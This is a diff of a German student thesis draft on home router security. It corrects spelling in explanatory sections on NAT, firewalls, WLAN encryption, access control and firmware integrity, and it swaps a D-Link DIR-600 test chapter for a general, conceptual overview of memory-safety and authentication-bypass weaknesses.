@@ -567,41 +567,41 @@
 	%--------------------------------------------------------------------------------%
 	%-----------Nochmal überarbeiten----formulierung und rechtschreibung anpassen----%
 	Networke Address Translation(NAT) ist ein Mechanismus, bei dem der Router interne 
-	IP-Adressen eines lokalen Netztwerks (LAN) in eine öffentliche IP-Adresse übersetzt.
-	Es gibt welweit ungefähr 4 Millarden public IPv4 Adressen, sie sind durch ihre Architektur begrenzt.
+	IP-Adressen eines lokalen Netzwerks (LAN) in eine öffentliche IP-Adresse übersetzt.
+	Es gibt weltweit ungefähr 4 Milliarden public IPv4 Adressen, sie sind durch ihre Architektur begrenzt.
 	Private Adressen werden lediglich innerhalb eines lokalen Netzwerks genutzt.
-	Haushalte oder Frimen haben alle eine private IP Adresse mit der sie mit dem Router verbunden sind.
-	Der Router wiederum hat eine public IP Adresse, und hat somit zugriff auf das Internet.
-	Über den Router können so alle Geräte auf das Internet zugreifen.
-	NAT übersetzet also ein Satzt von IP AdrAessen zu einem anderen Satz an IP-Adressen.
-	Es übersetzet also von Privat zu Public aber auch andersherum
+	Haushalte und Firmen haben alle eine private IP-Adresse über die sie mit dem Router verbunden sind.
+	Der Router ist die Schnittstelle zwischen den Geräten des Netzwerks und dem Internet.
+	Er hat eine public IP-Adresse, die ihm Zugang zum Internet gibt. Alle Geräte innerhalb des
+	Netzwerks teilen sich nach außen die public IP-Adresse des Routers.
+	NAT übersetz also einen Satz von IP-Adressen zu einem anderen Satz an IP-Adressen.
 
-	NAT selbst ist nicht offiziel ein Sicherheitsmechanismen, kann aber also solcher intepretiert werden
-	Den Aufgrund der übersetetzung mehrerer lokaler IP-Adressen zu eine publizierten kann von
-	außen nicht festgestellt werden, wie das betrachetet Netztwerk intern aufgebaut ist
-	oder wie viele sich in ihm befinden. Zudem ist keine direkte verbindung von außerhalb mit
-	den Geräten möglich solange dies nicht explizit erlaubt wird.
+	NAT selbst ist nicht offiziell ein Sicherheitsmechanismus, kann aber also solcher interpretiert werden.
+	Aufgrund der Übersetzung mehrerer lokaler IP-Adressen zu einer publizierten kann von
+	außen nicht festgestellt werden, wie das betrachtete Netzwerk intern aufgebaut ist
+	oder wie viele Geräte zu dem Netzwerk gehören. Zudem ist keine direkte Verbindung von außerhalb mit
+	den Geräten möglich, solange dies nicht explizit erlaubt wird.
 
-	NAT bietet eine impllizite Schutzwirkung, aber keine echte Sicherheit im klasischen Sinne.
-	Nicht angeforderte verbindungen werden blockiert, die Angriffsfläche wird reduziert und Geräte können
+	NAT bietet eine implizite Schutzwirkung, aber keine echte Sicherheit im klassischen Sinne.
+	Nicht angeforderte Verbindungen werden blockiert, die Angriffsfläche wird reduziert und Geräte können
 	nicht direkt adressiert werden. \cite{egevang2001b}
 	%Quelle(https://www.rfc-editor.org/rfc/rfc3022)%
 
 	\subsection{Paketfilterung und Stateful Firewalls}
 	\label{sec:Paketfilterung und Stateful Firewalls}
-	Eine Firewall ist ein zentrales Sicherheitselement in Netzwerken und Schützt diese vor 
+	Die Firewall ist das zentrale Sicherheitselement in Netzwerken und schützt diese vor 
 	unerlaubten Zugriffen und Bedrohungen, in dem sie den Datenverkehr überwacht.
-	Die Firewall filtert den Verkehr anhand von definierten Filtern, wobei dort die entschieden wird,
-	welche Datenpackete erlaubt oder blockiert werden.
-	Grundsätzlich wird zwischen zustandbehaftete(Stateful) und zustandlose(Statless) Firewalls entschieden,
-	wobei letztere den heutigen Standart darstellt.
+	Die Firewall filtert den Verkehr anhand von vordefinierten Regeln.
+	Es wird entschieden welche Datenpakete erlaubt oder blockiert werden.
+	Grundsätzlich wird zwischen zustandlosen(Statless) und zustandbehafteten(Stateful) Firewalls unterschieden.
+	Letztere sind heutzutage der Standard, zustandsbehaftete Firewalls wirken unterstützend.
 	
 	Zustandslose Firewalls (Stateless Firewalls)
-	Zustandslose Firewalls gehören zu den älteren Modellen. Si verlassen sich bei der
-	filterung der Daten auf eine Zugriffskontrolliste.
-	Die entscheidung in welche Kategorie ein Packet fällt wird aufgund der mitgelieferten
-	Informationen getroffen. Die Firewall speichert keine Informationen über den Satus oder den Kontext der
-	Verbindung. Die Filterung basiert auf der überprüfung der Access Controle List (ACL). Dabei werden Informationen
+	Zustandslose Firewalls gehören zu den älteren Modellen. Sie verlassen sich bei der
+	Filterung der Daten auf eine Zugriffskontrollliste.
+	Die Entscheidung in welche Kategorie ein Paket fällt, wird Aufgrund der mitgelieferten
+	Informationen getroffen. Die Firewall speichert keine Informationen über den Status oder den Kontext der
+	Verbindung. Die Filterung basiert auf der Überprüfung der Access Controle List (ACL). Dabei werden Informationen
 	aus dem Packet-Header ausgewertet insbesondere:
 	\begin{itemize}
 		\item{Quell-IP-Adresse}
@@ -609,18 +609,18 @@
 		\item{Portnummern}
 		\item{verwendetes Protokoll (z. B. TCP oder UDP)}
 	\end{itemize}
-	Da keine Zustandsinformationen gespeichert werden, kann die Firewall nicht erkenen ob ein Packet zu einer bestehenden
-	Verbindung gehört. Jede entscheidung wird also isoliert getroffen.
-	Der große Vorteil des Ansatz liegt im geringen Ressourcenverbrauch und der hohen Verarbeitungsgeschwindigkeit.
-	Daher werden sie in einer Umgebung mit sehr hohem Datenaufkommen eingesetzt und vorgeschatet, um einfache
+	Da keine Zustandsinformationen gespeichert werden, kann die Firewall nicht erkennen, ob ein Paket zu einer bestehenden
+	Verbindung gehört. Jede Entscheidung wird also isoliert getroffen.
+	Der große Vorteil des Ansatzes liegt im geringen Ressourcenverbrauch und der hohen Verarbeitungsgeschwindigkeit.
+	Daher werden sie vornehmlich in einer Umgebung mit sehr hohem Datenaufkommen eingesetzt, um einfache
 	Filteraufgaben zu übernehmen.
 	Allerdings hängt die Sicherheit stark von der Qualität der Konfiguration ab. Fehler in den Regeln können 
-	dazu führen, das unerwünschter Datenverkehr zugelassen wird.
+	dazu führen, dass unerwünschter Datenverkehr zugelassen wird.
 
 	Zustandsbehaftete Firewalls (Stateful Firewalls)
-	Die Zustandsbehaftete Firewall ist heute die am Häufigsten eingesetzte Firewall-Technologie.
-	Sie überwacht die Datenpackete und den Kontext des Datenverkehrs.
-	Hierzu wird eine sogennante Zustandstabelle (State Table) gewührt, welche die aktiven Verbindungen speichert.
+	Die zustandsbehaftete Firewall ist heute die am häufigsten eingesetzte Firewall-Technologie.
+	Sie überwacht sowohl die Datenpakete, als auch den Kontext des Datenverkehrs.
+	Hierzu wird eine sogenannte Zustandstabelle (State Table) geführt, welche die aktiven Verbindungen speichert.
 	Diese enthält Informationen wie:
 	\begin{itemize}
 		\item{Quell-IP-Adresse}
@@ -628,18 +628,18 @@
 		\item{Portnummern}
 		\item{Verbindungsstatus (z. B. aufgebaut, etabliert, beendet)}
 	\end{itemize}
-	Basierden auf diesen Informationen entscheiden die Firewall über die eingehenden Packete.
-	Dadurch ist eine dynamische Packetfilterung möglich.
-	Ein wesntlicher Vorteil ist die deutlich höhere Sicherheit, da nur solche Packete zugelassen werden, 
+	Basiserd auf diesen Informationen entscheiden die Firewall über die eingehenden Pakete.
+	Dadurch ist eine dynamische Paketfilterung möglich.
+	Ein wesentlicher Vorteil ist die deutlich höhere Sicherheit, da nur Pakete zugelassen werden, 
 	die Teil einer legitimen Verbindung sind. 
 	Allerdings ist der Ressourcenverbrauch deutlich höher als bei Zustandslose Firewalls.
-	Verbidungszustände müssen stetig neu gespeichert und verglichen werden.
-	Auch hier sind schlecht konfigurierte Firewalls anfäälig für Attacken wie beispielsweise
+	Verbindungszustände müssen stetig neu gespeichert und verglichen werden.
+	Auch hier sind schlecht konfigurierte Firewalls anfällig für Attacken wie beispielsweise
 	Denial-of-Service (DDoS) oder Man-in-the-Middle-Angriffe.
 
 	In der Praxis wird häufig eine Kombination aus beiden Ansätzen angewendet. Die Zustandslose Firewall filtert
 	den Datenverkehr vor und die Zustandsbehaftete Firewall bessert nach. Dadurch lässt sich eine Balance
-	zwischen Perfosmance und Sicherheit erreichen. \cite{scarfone2009b}
+	zwischen Performance und Sicherheit erreichen. \cite{scarfone2009b}
 
 	\subsection{WLAN-Verschlüsselung}
 	\label{sec:WLAN-Verschlüsselung}
@@ -650,12 +650,12 @@
 
 	WPA2
 	Für WPA2 muss eine Verschlüsselung durch AES-CCMP (Counter Mode with CBC\_MAC Protokoll) gegeben sein.
-	CCMP ist ein Sicherheitsmechanismus, der auf Advanced Encryption Standart (AES) basiert und sowohl
+	CCMP ist ein Sicherheitsmechanismus, der auf Advanced Encryption Standard (AES) basiert und sowohl
 	Vertraulichkeit als auch Integrität und Authentizität der Daten sicherstellt.
 	Das Verfahren verknüpft zwei AES Modi. Beim Counter Mode (CTR) ist für die
 	Verschlüsselung des Klartextes verantwortlich, der CBC-MAC (Cipher Block Chaining Message Authentication Code)
 	sorgt für die Integrität in dem er einen Authentifizierungswert berechnet. Dieser stellt sicher,
-	das die Daten nicht unbemerkt manipuliert werden können. Bevor die eigentliche übertragung der Daten
+	dass die Daten nicht unbemerkt manipuliert werden können. Bevor die eigentliche Übertragung der Daten
 	beginnt, wird ein Sitzungsschlüssel ausgehandelt.
 	\begin{itemize}
 		\item{Beide Seiten besitzen einen Pre-Shared Key (PSK)}
@@ -664,22 +664,22 @@
 		\item{Daraus wird der Pairwise Transit Key (PTK) berechnet}
 		\item{Der PTK ist in Teilschlüssel für die Verschlüsselung, Integrität und Nachrichtenvalidierung aufgeteilt}
 	\end{itemize}
-	WPA2 wird heute weittestgehend durch WPA3 ersetzt, da es einige Schwachstellen aufweist.
+	WPA2 wird heute weitestgehend durch WPA3 ersetzt, da es einige Schwachstellen aufweist.
 	Schwache Passwörter ermöglichen Offline-Brute-Force Angiffe. Angreifer können den Wiederholten Handshake ausnutzen
-	(KRACK-Angriff). Das wiederverwenden von Zufallszahlen kann die icherheit kompromittieren.
+	(KRACK-Angriff). Das Wiederverwenden von Zufallszahlen kann die Sicherheit kompromittieren.
 	
 	WPA3:
-	WPA3 ist die Weiterentwicklung von WPA2. Bei dem verfahren werden keine Sitzungsschlüssel mehr verwendet,
+	WPA3 ist die Weiterentwicklung von WPA2. Bei dem Verfahren werden keine Sitzungsschlüssel mehr verwendet,
 	sondern SAE(Dragonfly Handshake).
 	Der Personal-Mode ist für den Privatgebrauch konzipiert. Alle Nutzer verwenden einen Pre-Shared Key (PSK)
-	also das gleiche Passwort um das Netztwerk nutzen zu können. Der "Enterprise-Modus" wurde für Unternehmen
+	also das gleiche Passwort um das Netzwerk nutzen zu können. Der "Enterprise-Modus" wurde für Unternehmen
 	entwickelt. Er ermöglicht die individuelle Authentifizierung, durch den Benutzer. Dieser meldet sich mit dem 
-	individuellen Benutzernamen und Passwort am netztwerk an.
+	individuellen Benutzernamen und Passwort am Netzwerk an.
 	SAE (Dragonfly Handshake) bildet die Grundlage für einen sicheren Austausch der Sitzungsschlüssel zwischen
-	dem Access Point und dem WLAN-Client. Im Gegensatz zu WPA2 wird bei WPA3 das "Shared Secret". also das Geheimniss
-	nicht über den Funkkanal übertragen sondern nur das Ergebnis einer Berechnung. Zudem stellt SAE sicher,
-	dass ein Angreifer selbst wenn er das Passwort kenne sollte, keine im voraus aufgezeichneten Datenpackete
-	nachträglich entschlüsseln kann. Das nennt sich Perfek Forward Secrecy.
+	dem Access Point und dem WLAN-Client. Im Gegensatz zu WPA2 wird bei WPA3 das "Shared Secret", also das Geheimnis
+	nicht über den Funkkanal übertragen, sondern nur das Ergebnis einer Berechnung. Zudem stellt SAE sicher,
+	dass ein Angreifer, selbst wenn er das Passwort kennen sollte, keine im Voraus aufgezeichneten Datenpakete
+	nachträglich entschlüsseln kann. Das nennt sich Perfect Forward Secrecy.
 	\begin{itemize}
 		\item{Die Parteien starten mit einem Passwort}
 		\item{Beide Seiten berechnen einen Punkt auf einer elliptischen Kurve, basierend auf dem Passwort}
@@ -687,55 +687,55 @@
 		\item{Im 4-Way Handshake werden Zufallszahlen ausgetauscht}
 		\item{Das gemeinsame Geheimnis wird berechnet, ohne dass das Passwort selbst übertragen wird}
 	\end{itemize}
-	Dieses Vorgehen bietet Schutz gegen OffOffline-Brute-Force Angiffen. Zudem werden eine sensiblen Informationen
-	übertragen und durch das PFS können selbst bei bekanntmachung der Schlüssel, die vergangenen Sitzungen nicht entschlüsselt werden.
+	Dieses Vorgehen bietet Schutz gegen Offline-Brute-Force Angriffen. Zudem werden keine sensiblen Informationen
+	übertragen und durch das PFS können selbst bei Bekanntmachung der Schlüssel, die vergangenen Sitzungen nicht entschlüsselt werden.
 
 	OWE (Opportunistic Wireless Encryption)
 	OWE ermöglicht Verschlüsselung auch in offenen WLAN-Netzten ohne Passwort. Es wird automatisch ein temporärer
-	Schlüssel zwischen dem Client unde dem Access Point ausgehandelt. OWE bietet Schutz vor passivem Mithören, kann
+	Schlüssel zwischen dem Client und dem Access Point ausgehandelt. OWE bietet Schutz vor passivem Mithören, kann
 	aber keine Authentifizierung sicherstellen. \cite{frankel2007b, souppaya2012b}
 	%---Quelle(https://csrc.nist.rip/external/nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-153.pdf)---%
 
 	\subsection{Zugriffskontrolle}
 	\label{sec:Zugriffskontrolle}
-	Da der Router einen zentralen Bestandteil der Netzwerkinfrastruktur darstellt, muss der administrative
-	Zugriff besonders geschütz werden.
-	Zur absicherung des administrativen Zugriffs werden Authentifizierungsmechanismen eingesetzt.
-	Üblicherweise erfolgt dies über einen Benutztername und ein Passwort. 
+	Der Router ist ein zentraler Bestandteil der Netzwerkinfrastruktur, daher muss der administrative
+	Zugriff besonders geschützt werden.
+	Zur Absicherung des administrativen Zugriffs werden Authentifizierungsmechanismen eingesetzt.
+	Üblicherweise erfolgt dies über einen Benutzernamen und ein Passwort. 
 	Moderne Router unterstützten zusätzlich eine Mehrfaktorauthentifizierung sowie rollenbasierte Accounts, 
-	also die Aufteilung in Admin sowie eingeschränkte Nutzter.
-	Besonders wichtig ist es, ein starkes Passwort zu nutzten, sowie die Standartzugangsdaten zu ändern.
+	also die Aufteilung in Admin sowie eingeschränkte Nutzer.
+	Besonders wichtig ist es, ein starkes Passwort zu nutzten, sowie die Standardzugangsdaten zu ändern.
 	
 	Darüber hinaus sollte der Zugriff auf vertrauenswürdige Netzwerke beschränkt werden
 	Häufig wird der Zugriff ausschließlich aus dem Lokal Area Networke (LAN) erlaubt. 
-	Der Remote Administrator wird entweder deaktiviert oder stark eingeschränkt werden. 
-	Dies reduziert die Angriffsfläche erheblich, da das Webinterface nicht öffentlich Erreichbar ist.
+	Der Remote Administrator wird entweder deaktiviert oder stark eingeschränkt. 
+	Dies reduziert die Angriffsfläche erheblich, da das Webinterface nicht öffentlich erreichbar ist.
 
-	Desweiteren sollten unsichere Verwaltungsprotokolle wie HTTP und Telnet deaktiviert werden,
-	da diese Daten unverschlüsselt übertragen. Stattdessen sollten HTTPS und SSH verwendet werden.
+	Des Weiteren sollten unsichere Verwaltungsprotokolle wie HTTP und Telnet deaktiviert werden,
+	da diese Protokolle Daten unverschlüsselt übertragen. Stattdessen sollten HTTPS und SSH verwendet werden.
 
-	Neben dem administrativen Zugriff spielt auch die Zugriffskontrolle im Netzwerkverkehr eine bedeutente Rolle.
+	Neben dem administrativen Zugriff spielt auch die Zugriffskontrolle im Netzwerkverkehr eine bedeutende Rolle.
 	Router und Firewall kontrollieren hierbei welcher Netzwerkverkehr erlaubt oder blockiert wird.
-	Die zentrale Sicherheitskomponente ist die Stateful Firewall. 
-	Diese überwacht aktive Verbindungen und erlaubt nur etablierte oder explizit erlaubte Packete
-	und blockiert unerwünschte eingehende Packete. Außerdem kann sie eigene Regeln definieren.
+	Die zentrale Sicherheitskomponente ist die Stateful Firewall \ref{sec:Paketfilterung und Stateful Firewalls}. 
+	Diese überwacht aktive Verbindungen und erlaubt nur etablierte oder explizit erlaubte Pakete
+	und blockiert unerwünschte eingehende Pakete. Außerdem kann sie eigene Regeln definieren.
 
 	Die Access Controle Lists (ACLs) wird vorallem in Modernen und professionellen Routern genutzt.
-	Mit ihr kann granular definiert werden welche IP-Adressen kommunizieren dürfen, welche protokolle erlaubt sind
+	Mit ihr kann granular definiert werden welche IP-Adressen kommunizieren dürfen, welche Protokolle erlaubt sind
 	und welche Ports genutzt werden dürfen.
-	Dadurch kann der Netztwerkverkehr gezielt kontrolliert und eingeschränkt werden.
+	Dadurch kann der Netzwerkverkehr gezielt kontrolliert und eingeschränkt werden.
 
-	Eine weitere Zugriffskontrolle bietet die Netztwerksegmentierung. Moderne Router ermöglichen die Einrichtung 
-	seperater Netztbereiche beispielsweise durch das anlegen eines Gastnetzwerks und VLANs. 
-	Dadurch können Geräte sowie Benutztergruppen voneinander getrennt werden, wodurch die Ausbreitung eines Angriffs beschränkt wird.
+	Eine weitere Zugriffskontrolle bietet die Netzwerksegmentierung. Moderne Router ermöglichen die Einrichtung 
+	separate Netzbereiche beispielsweise durch das Anlegen eines Gastnetzwerks und VLANs. 
+	Dadurch können Geräte sowie Benutzergruppen voneinander getrennt werden, wodurch die Ausbreitung eines Angriffs beschränkt wird.
 	Zusätzlich können Router als VPNB-Endpunkte fungieren. 
 	Der Zugriff erfolgt dann über einen verschlüsselten und authentifizierten Tunnel,
-	wodurch der Zugriff auf den Router aus externen Netztwerken abgesichert ist. 
+	wodurch der Zugriff auf den Router aus externen Netzwerken abgesichert ist. 
 
 	In der Praxis ist die Zugriffskontrolle selbst oftmals weniger das Problem, sondern ihre Fehlkonfiguration.
-	Wenn beispielsweise Standartpasswörter nicht geändert werden, der Remote-Admin offen ist, unötige Ports
+	Wenn beispielsweise Standardpasswörter nicht geändert werden, der Remote-Admin offen ist, unnötige Ports
 	freigegeben werden oder unsichere Protokolle aktiviert sind, führt dies dazu das theoretisch vorhandene
-	Mechanismen wirkungslos sind. \cite{tracy2007b, }
+	Mechanismen wirkungslos sind. \cite{tracy2007b}
 
 	%---Quelle(https://nvlpubs.nist.gov/nistpubs/Legac019-16920:y/SP/nistspecialpublication800-41r1.pdf)---%
 	%---Quelle(https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-44ver2.pdf)---%
@@ -744,12 +744,12 @@
 	\label{sec:Firmware Integrität}
 	Die Firmware Integrität beschreibt die Eigenschaft eines Routers, sicherzustellen, dass die auf dem
 	Gerät laufende Firmware unverändert, authentisch und vertrauenswürdig ist. Dies ist ein zentraler
-	Sicherheitsmechanismus, da die Firmware ein kritischer bestandteil der Gesamtarchitektur ist.
-	Die Firmware ist das eingebette Betriebssystem des Routers. 
-	Eine Kompromittierung der Firmware erlaubt es Angreifern vollständige kontrolle über das
-	gesamte Gerät zu erlangen, einschließlich der Manipulation der Netztwerkverkehrs, der Umgehung
+	Sicherheitsmechanismus, da die Firmware ein kritischer Bestandteil der Gesamtarchitektur ist.
+	Die Firmware ist das eingebettete Betriebssystem des Routers. 
+	Eine Kompromittierung der Firmware erlaubt es Angreifern vollständige Kontrolle über das
+	gesamte Gerät zu erlangen, einschließlich der Manipulation der Netzwerkverkehrs, der Umgehung
  	von Sicherheitsmechanismen wie der Firewall sowie der Etablierung persistenter Schadsoftware.
-	Zur sicherstellung der Integrität wird in der Regel eine kryptographische Signaturprüfung eingesetzt.
+	Zur Sicherstellung der Integrität wird in der Regel eine kryptografische Signaturprüfung eingesetzt.
 	Der Hersteller des Routers signiert jedes Firware-Update.
 	Ablauf:
 	\begin{itemize}
@@ -757,563 +757,144 @@
 		\item{Firmware wird kryptographisch signiert (Private Key)}
 		\item{Router prüft beim Update die Signatur (Publlic Key im Gerät)}
 	\end{itemize}
-	Falls das Update ungültig ist wird es abgelehnt.
+	Falls das Update ungültig ist, wird es abgelehnt.
 	Ein weiterer Sicherheitsmechanismus ist der Secure Boot der den Router während des Startvorgangs schützt.
 	Beim Booten wird zuerst ein Bootlader geladen. Dieser prüft dann die Signatur der Firmware und startet sie nur dann,
-	wenn die prüfung positiv ausfählt. Andersnfalls lässt sich das Gerät nicht starten oder geht in den
+	wenn die Prüfung positiv ausfällt. Andernfalls lässt sich das Gerät nicht starten oder geht in den
 	Recovery-Modus. Dies stellt sicher, das keine dauerhaft kompromittierte Firmware geladen wird.
-	Der Trusted Secure Boot bietet eine Erweiterung des Secure Boot. Jede Stufe des Boot Prozess prüft die nächste,
-	also die Hardare den Bootloade, der Bootloader das Kernel und das kernel die Systemdienste.
-	Ziel dabei ist es eine durchgängige kryptographische Vertrauenskette zu bilden.
-	Zudem verfügt der Rooter über einen Rollback Schutz, welcher verhindet da die Firmware auf eine ältere,
-	verwundbare version zurückgesetzt werden kann. Ohne diesen Schutz hätten Angreifer die Möglichkeit alte Firmware
+	Der Trusted Secure Boot bietet eine Erweiterung des Secure Boot. Jede Stufe des Boot-Prozess prüft die nächste,
+	also die Hardware den Bootloader, der Bootloader das Kernel und das Kernel die Systemdienste.
+	Ziel dabei ist es eine durchgängige kryptografische Vertrauenskette zu bilden.
+	Zudem verfügt der Router über einen Rollbackschutz, welcher verhindert da die Firmware auf eine ältere,
+	verwundbare Version zurückgesetzt werden kann. Ohne diesen Schutz hätten Angreifer die Möglichkeit alte Firmware
 	mit bekannten Schwachstellen zu installieren.
-	Angriffe auf die Firmware stellen ein besonders Risiko dar, da sid unterhlab von firewall und Betriebssystem liegt 
-	und für den benutzt oftmals unichtbar zu erkenen ist. \cite{regenscheid2018bb}
+	Angriffe auf die Firmware stellen ein besonders Risiko dar, da sie unterhalb von Firewall und Betriebssystem liegt 
+	und für den Benutzter oftmals schwer zu erkennen sind. \cite{regenscheid2018bb}
 
-	\chapter{Tests D-Link DIR-600}
-	\label{sec:Tests D-Link DIR-600}
-	%-------------TEST die alle NICHT funktioniert haben---------------------%
-	Ziel der Untersuchung war es, potenzielle Sicherheitslücken zu identifizieren und zu testen.
-	Die Analyse wurde unter Kali Linux durchgeführt, wobei der Router sowohl über Ethernet als auch
-	über das Wireless Local Area Network (WLAN) verbunden war.
-	Die IP-Adresse des Gerätes (192.168.0.1) wurde mittels \texttt{ping} sowie \texttt{ip route}
-	verifiziert.
+	\chapter{Schachstellen im Router}
+	\label{sec:Schwachstellen im Router}
+	%-----Allgemeine beschreibung aktuller Router Schwachstellen----------%
+	%-----Herstellen usw werden hier nicht spezifiziert-------------------%
+	%-----Schwachstellen sollen hier im Allgemeinen betrachtet werden-----%
+	Im folgenden Kapitel soll es um die allgemeinen Schwachstellen in Routern gehen.
+	Es werden verschiedene Angriffsarten und anderweitiger Missbrauch der Router beschrieben, 
+	sowie aktuelle Beispiele für unsichere Router und deren Auswirkungen.
+	\subsection{Speicherfehler}
+	Speicherfehler bezeichnen Schwachstellen, die durch falsche Implementierung entstehen und 
+	den Speicher Kompromittieren. Sie bilden häufig die Grundlage für weiterführende Angriffe und bieten dem
+	Angreifer einen Einstieg in das System.
+
+	Einer der bekanntesten Speicherfehler ist der Buffer Overflow. Dabei werden Operation auf einem Speicherpuffer
+	durchgeführt, wobei Daten über die vorgesehene Speichergrenze hinaus gelesen und geschrieben werden. 
+	Der dadurch angesprochene angrenzende Speicherbereich kann andere Variablen, Datenstrukturen oder
+	internen Programmen verlinken, wodurch es möglich wird auf diese internen Strukturen des Routers
+	zuzugreifen oder diese zu manipulieren. In der Praxis kann ein Buffer Overflow dazu genutzten werden, 
+	um beliebigen Code auszuführen, Programmabläufe zu verändern oder sicherheitsrelevante Daten zu überschreiben.
+	Darüber hinaus kann es zur Korruption von relevantem Speicher kommen was zu 
+	einem möglichen korrupieren kritischer Speicherbereiche führen, was folglich zu Destabilisierung oder sogar 
+	vollständigem Ausfall des Systems führen kann. In einigen Fällen lassen sich sensible Informationen
+	wie Zugangs- oder Systemdaten aus dem Speicher auslesen, welche wiederum für weitere Angriff verwendet werden können.
+
+	Eine weitere relevante Schwachstelle ist der Integer Overflow. 
+	Dieser tritt auf, wenn arithmetische Operationen Werte erzeugen, die außerhalb des darstellbaren Wertebereichs eines
+	Datentyps liegen.
+	Der Speicherüberlauf führt zu einem sehr kleinen oder einem negativen Ergebnis.
+	Diese Schwachstelle kann sicherheitskritische Auswirkungen haben, 
+	insbesondere wenn die betroffenen Werte für Speicherallokation genutzt, Schleifenbedingungen oder Indexberechnungen verwendet werden. 
+	Diese Fehler können genutzt werde, um unvorhersehbares Systemverhalten zu provozieren oder gezielte Abstürze herbeizuführen.
+	In bestimmten Fällen kann ein Integer Overflow einen Buffer Overflow auslösen, etwa wenn fehlerhafte 
+	Größenberechnungen für Speicherpuffer verwendet werden.
+	Dies führt zu den oben aufgeführten Risiken. 
+	Falls der Overflow in einer Indexvariable für einer Schleife ausgeführt wird,
+	könnte diese Schleife zur falschen Zeit, also entweder zu früh, zu spät oder 
+	gar nicht terminiert werden. Zu viele Schleifen Iterationen können dazu führen, das zu viel Speicher Ressourcen 
+	verwendet werden, was wiederum zum Bruch des Systems führt oder andere Denial-of-Service-Attacken begünstigt. 
+	\cite{cwecwe190integer, cwecwe119improper, smashingstackfun}
+
+	\subsection{Authentifizierungs- und Zugriffsfehler}
+	Zu den Authentifizierungs- und Zugriffsfehler, gehört jede Art der Schwachstelle die es einem 
+	Angreifer ermöglicht Sicherheitsmechanismen zur Identitätsprüfung oder Zugriffskontrolle
+	zu umgehen.
 	
-	Grundtest:
-	\begin{table}[h]
-		\hypertarget{tabelle1}{}
-		\begin{tabularx}{\columnwidth}{|X|X|X|}
-			\hline
-			Pingen des Routers & ping 192.168.0.1 & Router wurde erreicht \\
-			\hline
-			Zugriff auf die Admin Seite & Firefox (http://192.168.0.1) & Login Seite wurde geladen, aber Authentifizierungsdaten schlugen fehl \\
-			\hline
-		\end{tabularx}
-		\caption{Testtabelle}
-	\end{table}
-
-	Es wurden verschiedene Zugangsdaten getestet, jedoch ohne Erfolg. Nach einem Factory Reset
-	durch das Gedrückthalten der Reset-Taste für etwa 15 Sekunden wurden die Zugangsdaten auf die
-	Werkseinstellungen zurückgesetzt. Anschließend war ein Login mit dem Standardbenutzer
-	\texttt{admin} und einem leeren Passwort möglich.
-
-	Die Bewertung der identifizierten Schwachstellen erfolgt angelehnt an das Common Vulnerability
-	Scoring System (CVSS). Dabei werden insbesondere Angriffsvektor, Komplexität, benötigte Privilegien
-	sowie die Auswirkung auf Vertraulichkeit, Integrität und Verfügbarkeit berücksichtigt.
-
-	\section{Architektur des Routers}
-	\label{sec:Architektur des Routers}
-	Der betrachtete Router ist von der Firma D-Link und gehört zu der DIR-600 Reihe.
-	Die Hardware Version ist Bx, wobei x für 1 oder 2 steht.
-
-	\begin{figure}[H]
-		\centering
-		\includegraphics[width=\textwidth]{img/Aufbau_Router.pdf}
-		\caption{Aufbau des Routers}
-		\label{fig:Aufbau Router}
-	\end{figure}
+	Ein zentraler Angriffstyp ist der Authentication Bypass.
+	Authentifizierung bezeichnet des Prozesses der Verifikation einer digitalen Identität, typischerweise durch
+	Benutzername und Passwort. Bei Umgehung der Authentifizierung bekommt der Angreifer Zugriff auf das System
+	ohne sich vorher Authentifizieren zu müssen.
+	Dies ist beispielsweise möglich, indem die URL Parameter manipuliert werden oder die
+	Session gefälscht wird. 
+	Die Ursachen die solche Angriffsvektoren ermöglichen, können entlang der gesamten Software Entwicklungszyklus auftreten. 
+	In der Entwurfsphase entstehen sie etwa durch unzureichende definierte Zugriffskontrollen oder
+	die Verwendung  unsicherer Protokoll für das Übertragen der Zugangsdaten.
+	In der Implementierungsphase sind häufig fehlerhafte Vaidierungsmechanismen
+	oder unsichere Pogrammierpraktiken verantwortlich.
+	Während der Bereitstellung können Fehlkonfigurationen, unzureichende Dokumentation oder mangelnde 
+	Fachkenntnisse dazu führen, dass Sicherheitsmechanismen nicht korrekt aktiviert oder umgesetzt werden.
 	
-	Der Router folgt einer klassischen Embedded-System-Architektur mit klar getrennten Schichten.
-	Nach dem Start wird der Bootloader geladen. Er ist dafür zuständig die Hardware zu initialisieren, 
-	und den Linux Kenerl aus dem Flash zu laden, welcher die Hardware abstrahiert.
-	Der Linux Kernel übernimmt die Prozessverwaltung, den Netzwerk-Stack und
-	die Treibersteuerung. Das Root-Filesystem (SquashFS) auf das in Kapitel X noch näher eingegangen wird, enthält
-	eine minimalistische Userspace-Umgebung auf Basis von Busybox. 
-	Das Konfigurationsdatenbank (xmldb) ist das zentrale Element der Firmware, auf das mit dem Tool
-	xmldbc zugegriffen wird. Dort werden in der sämtliche Systemparameter gespeichert und über Skripte dynamisch in
-	konkrete Systemkonfigurationen umgesetzt. Die Steuerung erfolgt über ein Webinterface, das mit PHP-Skripten
-	mit der Konfigurationsschicht interagiert. Netzwerkdienste wie DHCP, NAT und WLAN werden durch eine
-	Kombination aus Kernel-Modus und Userspace-Daemons realisiert.
+	Mit der Manipulation von HTTP-Parameter kann die Authentifizierung vollständig Umgangen werden, etwa wenn
+	serverseitige Prüfungen fehlen oder fehlerhaft implementiert wurden. Ebenso unsicher sind Session-Management-Mechanismen, 
+	die Session-IDs nicht ausreichend zufällig generieren. Den dann können Angreifer IDs
+	vorhersagen und eine gültige Sitzung übernehmen.
 
-	Der Router nutzt iptables für Routing und NAT, hostapd für WLAN und stellt einen integrierten Webserver
-	mit HTTP und PHP zum Management bereit. Netzwerkdienste wie DHCP, DNS und PPP werden über spezialisierte Daemons und
-	Skripte gesteuert. \cite{hostapdieee80211ab, netfilteriptablesprojectb, dlinksupportresourcesb}
-
-	\section{Analyse des Netzwerkverkehrs}
-	\label{sec:Analyse des Netzwerkverkehrs}
-
-	\subsection{Werkseinstellungen}
-	\label{sec:Werkseinstellungen}
-	Vor Beginn der Tests wurde der Router auf die Werkeinstellungen mithilfe des Reset-Knopfs zurückgesetzt.
-	Der Router ist mit dem Laptop über ein LAN-Kabel mit Port 1 verbunden. Der Router ist mit dem Internet verbunden.
-	Zum Mittschnitt des Netzwerkverkehrs wurde das Tool Wireshark verwendet.
